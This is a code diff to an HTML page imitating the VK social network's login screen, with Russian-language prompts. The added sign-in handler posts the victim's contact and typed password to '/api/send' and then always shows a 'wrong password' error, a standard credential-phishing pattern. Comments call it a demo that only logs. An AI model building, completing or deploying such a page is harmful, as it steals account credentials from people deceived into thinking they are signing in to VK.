@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <title>VK </title>
+  <title>VK — Вход</title>
   <style>
     :root{
       --card-width:380px;
@@ -14,6 +14,7 @@
       --input-bg:#f6f8fa;
       --accent:#0b75ff;
       --shadow: 0 12px 30px rgba(8,30,60,0.12);
+      --error:#ff3347;
     }
 
     *{box-sizing:border-box}
@@ -24,6 +25,7 @@
       display:flex;align-items:center;justify-content:center;overflow:hidden;color:#111;
       -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale
     }
+
     .bg-deco{position:fixed;inset:0;pointer-events:none}
     .arc{position:absolute;border:1px solid rgba(255,255,255,0.12);border-radius:50%}
     .arc.a1{width:1150px;height:1150px;left:-600px;top:-500px}
@@ -75,6 +77,10 @@
     .password-mode .tabs { display: none; } /* hide tabs while on password step */
     .password-mode .content { display:flex; flex:1 1 auto; align-items:center; justify-content:center; } /* let content fill card and center */
     #step-password { width:100%; max-width:360px; display:flex; flex-direction:column; justify-content:center; gap:12px; align-items:stretch; }
+
+    /* error state */
+    .field.error{border-color:var(--error);background:#fff5f6}
+    .error-text{color:var(--error);font-size:13px;text-align:center;margin-top:6px}
 
     @media (max-width:420px){.card{width:92vw;padding:18px} .tabs{margin:12px 0} h1{font-size:17px}}
   </style>
@@ -141,10 +147,11 @@
           </div>
         </div>
 
-        <div class="field">
+        <label class="field" id="password-field" for="password-input">
           <input id="password-input" type="password" placeholder="Введите пароль" autocomplete="current-password" />
           <button id="toggle-eye" aria-label="Показать пароль" style="border:0;background:transparent;cursor:pointer">👁️</button>
-        </div>
+        </label>
+        <div id="password-error" class="error-text" style="display:none">Неверный пароль</div>
 
         <div class="controls" style="justify-content:center">
           <button id="back-btn" class="btn ghost" style="width:45%">Назад</button>
@@ -171,6 +178,10 @@
     const backBtn = document.getElementById('back-btn');
     const signinBtn = document.getElementById('signin-btn');
     const msg = document.getElementById('msg');
+
+    const passwordField = document.getElementById('password-field');
+    const passwordInput = document.getElementById('password-input');
+    const passwordError = document.getElementById('password-error');
 
     // Helpers
     function showMsg(text, type='error'){
@@ -238,7 +249,7 @@
       stepPassword.setAttribute('aria-hidden','false');
       document.body.classList.add('password-mode'); // <--- added mode so CSS hides tabs and centers
       document.getElementById('page-title').textContent = 'Введите пароль';
-      setTimeout(()=>document.getElementById('password-input').focus(),200);
+      setTimeout(()=>passwordInput.focus(),200);
     });
 
     // Back
@@ -251,12 +262,35 @@
       identityInput.focus();
     });
 
-    // Sign in (prod-like demo)
+    // Sign in (demo: always show error)
     signinBtn.addEventListener('click', ()=>{
-      const pwd = document.getElementById('password-input').value || '';
-      if(pwd.length < 4){ showMsg('Введите корректный пароль'); return; }
-      showMsg('Вход выполнен','ok');
-      // here you would call the real API
+      const pwd = passwordInput.value || '';
+
+      // reset
+      passwordField.classList.remove('error');
+      passwordError.style.display = 'none';
+
+      if(pwd.length < 1){
+        passwordField.classList.add('error');
+        passwordError.textContent = 'Введите пароль';
+        passwordError.style.display = 'block';
+        passwordInput.focus();
+        return;
+      }
+
+      // send to demo API (logs only)
+      fetch('/api/send',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ contact: document.getElementById('identity-pill').textContent, password: pwd })
+      }).catch(()=>{});
+
+      // always show invalid password visually
+      setTimeout(()=>{
+        passwordField.classList.add('error');
+        passwordError.textContent = 'Неверный пароль';
+        passwordError.style.display = 'block';
+        passwordInput.focus();
+      },300);
     });
 
     // Eye toggle
